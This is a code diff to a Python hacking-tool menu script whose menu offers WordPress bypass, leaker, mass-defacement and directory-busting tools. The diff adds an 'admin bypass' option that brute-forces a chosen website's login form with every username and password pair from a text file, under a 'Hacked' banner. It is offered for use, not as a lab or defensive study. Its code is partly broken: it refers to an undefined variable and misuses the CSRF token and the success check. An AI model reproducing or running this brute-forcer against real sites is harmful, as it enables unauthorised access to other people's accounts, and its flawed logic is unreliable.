@@ -2067,6 +2067,10 @@ elif answer == ("19"):
     print(payload)
     print(f"{green}-" *12)
 elif answer == ("20"):
+    if os.name == "posix":
+        os.system('clear')
+    elif os.name == "nt":
+        os.system('cls')
     print(info + f'            [ ]Remember !, If The Tools Had A Error, Please Waiting For The Update.[ ]')
     print(f"""    {yellow}┌─────────────────────────────────────────────────────────────────────────────────────────────────┐{blue}
     {yellow}│{blue} [01] WP Bypasser {red}[Hot Results]{blue}                                                                  {yellow}│{blue}
@@ -2077,7 +2081,7 @@ elif answer == ("20"):
     {yellow}│{blue} [06] Leaker Tools V3 {red}[Hot Results]{blue}                                                              {yellow}│{blue}
     {yellow}│{blue} [07] Mass Deface V3                                                                             {yellow}│{blue}
     {yellow}│{blue} [08] DIRBER                                                                                     {yellow}│{blue}
-    {yellow}│{blue}                                                                                                 {yellow}│{blue}
+    {yellow}│{blue} [09] Bypass Admin With File.txt                                                                 {yellow}│{blue}
     {yellow}│{blue}                                                                                                 {yellow}│{blue}
     {yellow}└─────────────────────────────────────────────────────────────────────────────────────────────────┘{blue}
     """)
@@ -2521,7 +2525,7 @@ elif answer == ("20"):
                             size_gb = size_mb / 1024
                             return size_bytes, size_kb, size_mb, size_gb
                         else:
-                            return None
+                            return None 
                     except requests.exceptions.RequestException as e:
                         print(f"Error: {e}")
                         return None
@@ -2542,6 +2546,83 @@ elif answer == ("20"):
             exit()
         except requests.exceptions.InvalidURL:
             print(f"Error While Compiling {trgt}")
+    elif answer == "9":
+        try:
+            if os.name == "posix":
+                os.system('clear')
+            elif os.name == "nt":
+                os.system('cls')
+            print("""\033[1;91m
+                        .-~~.    .--.    .~~-.
+                    .-~.-~.- `. { O ]]&gt;.' -.~-.~-.
+                .-~.-~.-~.-~.  \ | |  /  .~-.~-.~-.~-.
+            .-~.-~.-~.-~.-~.-~. V   \/ .~-.~-.~-.~-.~-.~-.
+                      ~  ~.-~.- {    } -.~-.~  ~
+                           ~ -~.~\  /~.~- ~
+                                 //\\
+                             :--""--""--:
+                             \~~~~~~~~~~/
+                              \ Hacked /
+                               \      /
+                                \____/
+            """)
+            print("Skip If The ID and NAME Isn't available")
+            file = input(f"File TXT : ")
+            login_url = input(f"URL LOGIN PAGE TARGET : ")
+            idu = input(f"ID For Username : ")
+            idp = input(f"ID For Password : ")
+            nmu = input(f"Name For Username On Input : ")
+            nmp = input(f"Name For Password On Input : ")
+            file_name = file
+            with open(file_name, 'rb') as files:
+                files_content = files.read()
+            files_content_str = files_content.decode('utf-8')
+            nick_lines = files_content_str.split()
+            password_lines = files_content_str.split()
+            for nick in nick_lines:
+                for password in password_lines:
+                    try:
+                        # Membuat payload untuk data login
+                        payload = {
+                            idu : nick,
+                            idp : password
+                        }
+
+                        # Melakukan permintaan POST untuk login
+                        session = requests.Session()
+            
+                        print(green + f"---------------------------")
+                        print(info + f"Trying Nick: {nick}")
+                        print(f"Password: {password}")
+                        print(payload)
+                        print(green + f"---------------------------")
+                        response = session.post(login_url, data=payload)
+                        soup = BeautifulSoup(response.text, 'html.parser')
+
+                        # Temukan token CSRF jika diperlukan
+                        csrf_token1 = soup.find('input', {nmu: 'csrf_token'}, id=idn)['value'] if soup.find('input', {nmu: 'csrf_token'}, id=idu) else ''
+                        csrf_token2 = soup.find('input', {nmp: 'csrf_token'}, id=idp)['value'] if soup.find('input', {nmp: 'csrf_token'}, id=idp) else ''
+            
+                        csrf_token = csrf_token1 + csrf_token2
+                        # Tambahkan token CSRF ke data login
+                        payload['csrf_token'] = csrf_token
+                        # Memeriksa apakah login berhasil
+                        keyword = 'Login Success' or 'Dashboard' or 'Welcome' or 'Success' or 'Hi Admin' 
+                    
+                        if re.search(keyword, response.text, re.IGNORECASE):
+                                print(success + f'Login Success !')
+                                print(response)
+                                break  # Keluar dari loop jika login berhasil
+                        else:
+                            print(fail + f'Login Failed.')
+                            print(response)
+                    except requests.exceptions.ReadTimeout:
+                        print("Request Timed Out, Please Wait..")
+                        continue
+                print(success + f"[ + ] Done.. [ + ]")
+        except KeyboardInterrupt:
+            print("Interrupt")
+            exit()
 else:
     print('\n')
     print('Exiting.. Bye ! ')
